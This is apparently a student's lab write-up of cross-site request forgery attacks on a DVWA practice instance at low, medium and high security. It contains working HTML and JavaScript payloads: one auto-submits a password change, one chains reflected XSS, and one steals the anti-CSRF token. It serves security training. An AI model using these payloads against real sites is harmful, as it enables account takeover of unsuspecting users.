`FOR ALL CASES USER MUST BE LOGGED IN`

## LOW
- Here attacker had to get the user to open a web page hosted by attacker which had the code below. 
- This is the get request url to change the password.
- I create an anchor tag ref to the url and us js to click on it and pw was changed.

```
<!-- Works for low -->

<body onload="document.querySelector('a').click();">

	<a href="http://192.168.0.104/dvwa/vulnerabilities/csrf/?password_new=termite&password_conf=termite&Change=Change">lol</a>

</body> 

<!-- low -->
```

## MEDIUM
- Same like above Social Engineering to get till this page.. 
- here server had a header referer verification
- since verification was based on partial text match in url, i.e. it checked for *goole* as referer but since user was navigated to pw change request by our site the header referer would have our page's url. 
- to by pass this we can make a page of that name and use that path.
	- i.e. evil.com/goole
- another way was to user xss to make user make that request from the same website 
- below code uses reflective xss and adds img tag ref to malicious url to user's page
```
<!-- Should work for Medium -->

<body onload="document.forms[0].submit()">

	<form action="http://192.168.0.104/dvwa/vulnerabilities/xss_r/" method="GET">
	
		<input type="hidden" name="name" value="<img src='http://192.168.0.104/dvwa/vulnerabilities/csrf/?password_new=dumbell&password_conf=dumbell&Change=Change'">

		<input type="submit">Submit</input>

	</form>

</body>

<!-- medium -->
```

## High
- For high there was anti-csrf token implemented by dev.
- what we did here was similar to our anti-csrf brute forcing, we created a javascript file which would grab a csrf token for us by requresting the password change page and then use that token to send another request to change the password.

```
var theUrl = 'http://192.168.0.106/dvwa/vulnerabilities/csrf/';
var pass = 'admin';
if (window.XMLHttpRequest){
    xmlhttp=new XMLHttpRequest();
}else{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange=function(){
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        var token = match[1];
        var new_url = 'http://192.168.0.106/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
        if(!hacked){
            alert('Got token:' + match[1]);
            hacked = true;
            xmlhttp.open("GET", new_url, false );
            xmlhttp.send();  
        }
    }
};
xmlhttp.open("GET", theUrl, false );
xmlhttp.send();  
```